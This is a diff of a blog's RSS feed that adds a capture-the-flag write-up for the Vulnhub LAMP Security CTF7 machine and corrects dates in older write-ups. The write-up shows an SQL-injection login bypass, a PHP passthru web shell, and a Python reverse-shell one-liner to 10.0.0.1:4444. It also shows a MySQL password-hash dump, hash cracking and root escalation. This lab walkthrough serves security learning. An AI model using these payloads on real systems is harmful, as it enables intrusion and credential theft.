@@ -5,9 +5,193 @@
     <description></description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 08 Jan 2018 15:28:41 +0100</pubDate>
-    <lastBuildDate>Mon, 08 Jan 2018 15:28:41 +0100</lastBuildDate>
+    <pubDate>Mon, 08 Jan 2018 15:50:38 +0100</pubDate>
+    <lastBuildDate>Mon, 08 Jan 2018 15:50:38 +0100</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>Lamp Security CTF7 Writeup</title>
+        <description>&lt;p&gt;Hello everyone. &lt;a href=&quot;http://www.vulnhub.com/entry/lampsecurity-ctf7,86/&quot;&gt;LAMP Security CTF7&lt;/a&gt; was created by &lt;a href=&quot;http://hello%20everyone.%20lamp%20security%20ctf7%20is%20an%20easy%20and%20funny%20ctf%20created%20by%20mad%20irish/&quot;&gt;Mad Irish&lt;/a&gt;. You can find it on &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;Vulnub&lt;/a&gt; or on &lt;a href=&quot;https://www.root-me.org/&quot;&gt;root-me&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ok let’s start to enumerate the services:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syrion@backbox:~$ nmap -sT -sV -p 1-65535 ctf07.root-me.org
+
+PORT      STATE  SERVICE     VERSION
+22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)
+80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))
+139/tcp   open   netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
+901/tcp   open   http        Samba SWAT administration server
+5900/tcp  closed vnc
+8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))
+10000/tcp open   http        MiniServ 1.610 (Webmin httpd)
+Device type: general purpose|storage-misc|broadband router|media device|WAP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I ran dirsearch and in the meanwhile I seen the web site on port 80:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On port 8080 there was this login:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The login was vulneable to SQL Injection. I logged in with ‘ or 1=1 — -. There was a kind of CMS:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I uploaded a shell by creating a new reading:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Before that, Dirsearch showed me the directory with all the uploaded files:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok the shell worked:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used this python payload to open a reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
+socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4444));os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
+([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And it worked:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syrion@backbox:~$ nc -lvp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from [212.83.142.84] port 4444 [tcp/*] accepted (family 2, sport 57758)
+sh: no job control in this shell
+sh-4.1$ python -c “import pty;pty.spawn(‘/bin/bash’);”
+python -c “import pty;pty.spawn(‘/bin/bash’);”
+bash-4.1$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After some local enumerations, I found the credentials of mysql in a php page, so I accessed to mysql and I found some interesting credentials:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1$ mysql -u root
+mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 26
+Server version: 5.1.66 Source distribution
+Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.
+
+mysql&amp;gt; show databases;
+show databases;
++——————–+
+| Database           |
++——————–+
+| information_schema |
+| mysql              |
+| roundcube          |
+| website            |
++——————–+
+4 rows in set (0.00 sec)
+
+mysql&amp;gt; use website;
+use website;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&amp;gt; show tables;
+show tables;
++——————-+
+| Tables_in_website |
++——————-+
+| contact           |
+| documents         |
+| hits              |
+| log               |
+| newsletter        |
+| payment           |
+| trainings         |
+| trainings_x_users |
+| users             |
++——————-+
+9 rows in set (0.00 sec)
+
+mysql&amp;gt; select username,password from users;
+select username,password from users;
++——————————-+———————————-+
+| username                      | password                         |
++——————————-+———————————-+
+| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 |
+| john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 |
+| alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 |
+| ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 |
+| leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a |
+| julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 |
+| michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 |
+| bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e |
+| neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 |
+| charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf |
+| foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a |
+| test@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |
++——————————-+———————————-+
+12 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I used Crackstation to crack all the hashes:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-01-06-lamp-security-ctf7-writeup/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At this point I tried to become the user brian:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1$ su brian
+su brian
+Password: my2cents
+[brian@localhost inc]$ id
+id
+uid=501(brian) gid=501(brian) groups=501(brian),10(wheel),500(webdev),512(admin) context=system_u:system_r:httpd_t:s0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The user Brian was a sudo user, and I become root:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[brian@localhost inc]$ sudo su
+sudo su
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+#1) Respect the privacy of others.
+#2) Think before you type.
+#3) With great power comes great responsibility.
+
+[sudo] password for brian: my2cents
+
+[root@localhost inc]# id
+id
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
+[root@localhost inc]# cat /passwd
+cat /passwd
+688986705024f447914a24e0dd903b39
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bye!&lt;/p&gt;
+</description>
+        <pubDate>Fri, 06 Jan 2017 22:30:00 +0100</pubDate>
+        <link>http://localhost:4000/blog/lamp-security-ctf7-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/lamp-security-ctf7-writeup/</guid>
+        
+        <category>vulnhub</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>Mr-Robot: 1 Writeup</title>
@@ -40,13 +224,13 @@ PORT STATE SERVICE VERSION
 
 &lt;p&gt;The website was the same on port 80 and 443:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-21-mr-robot-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-21-mr-robot-1-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It was an animated console on a fsociety machine 😛&lt;/p&gt;
 
 &lt;p&gt;But… look at this:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-21-mr-robot-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-21-mr-robot-1-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;First Key :&lt;/p&gt;
 
@@ -63,7 +247,7 @@ PORT STATE SERVICE VERSION
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php passthru($_GET[“cmd”]); ?&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-21-mr-robot-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-21-mr-robot-1-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I got a reverse shell on netcat by using this payload:&lt;/p&gt;
 
@@ -133,7 +317,7 @@ nmap&amp;gt; ! cat /root/key-3-of-3.txt
 
 &lt;p&gt;Goodbye friend.&lt;/p&gt;
 </description>
-        <pubDate>Thu, 21 Dec 2017 22:00:00 +0100</pubDate>
+        <pubDate>Wed, 21 Dec 2016 22:00:00 +0100</pubDate>
         <link>http://localhost:4000/blog/mr-robot-1-writeup/</link>
         <guid isPermaLink="true">http://localhost:4000/blog/mr-robot-1-writeup/</guid>
         
@@ -188,23 +372,23 @@ Warning: include_once() [function.include]: Failed opening ‘inc/pagina.php.php
 
 &lt;p&gt;The warning “include_once(inc/pagina.php.php)” helped me to understand I needed a null byte:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok, I found a LFI but i needed to upload something for run code. On blog page there was this NanoCMS:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I found this &lt;a href=&quot;http://www.securityfocus.com/bid/34508&quot;&gt;vulnerability&lt;/a&gt; for NanoCMS (DirBuster found the same file):&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok I got the username and password hash:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Authentication was successful, I created a new page containing a classic “&lt;?php passthru($_GET[“cmd”]); ?&gt;”:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf5-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf5-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I got a reverse shell on netcat by using this payload:&lt;/p&gt;
 
@@ -244,7 +428,7 @@ bash-3.2#
 
 &lt;p&gt;Bye bye!!!&lt;/p&gt;
 </description>
-        <pubDate>Wed, 20 Dec 2017 22:30:00 +0100</pubDate>
+        <pubDate>Tue, 20 Dec 2016 22:30:00 +0100</pubDate>
         <link>http://localhost:4000/blog/lamp-security-ctf5-writeup/</link>
         <guid isPermaLink="true">http://localhost:4000/blog/lamp-security-ctf5-writeup/</guid>
         
@@ -287,23 +471,23 @@ No exact OS matches for host (test conditions non-ideal).
 
 &lt;p&gt;In the meantime,  I ran DirBuster, and I noticed this file:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;It was the database’s structure:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;This was the website on port 80:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I noticed this xss on the search bar:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Then I found an SQL Injection on the blog:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;At this pont I started to enumerate the select statement’s parameters by using this payloads:&lt;/p&gt;
 
@@ -314,15 +498,15 @@ No exact OS matches for host (test conditions non-ideal).
 
 &lt;p&gt;They were five!&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;I needed to know which parameters were visible:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;And then I performed the full SQL Inection (i knew the database structure because of db.sql):&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/posts/2017/2017-12-20-lamp-security-ctf4-writeup/img8.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/posts/2016/2016-12-20-lamp-security-ctf4-writeup/img8.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Ok let’s use &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack the hash. I tried to login as dstevens via ssh with the following credentials:&lt;/p&gt;
 
@@ -357,7 +541,7 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 
 &lt;p&gt;Bye bye!&lt;/p&gt;
 </description>
-        <pubDate>Wed, 20 Dec 2017 22:00:00 +0100</pubDate>
+        <pubDate>Tue, 20 Dec 2016 22:00:00 +0100</pubDate>
         <link>http://localhost:4000/blog/lamp-security-ctf4-writeup/</link>
         <guid isPermaLink="true">http://localhost:4000/blog/lamp-security-ctf4-writeup/</guid>
         
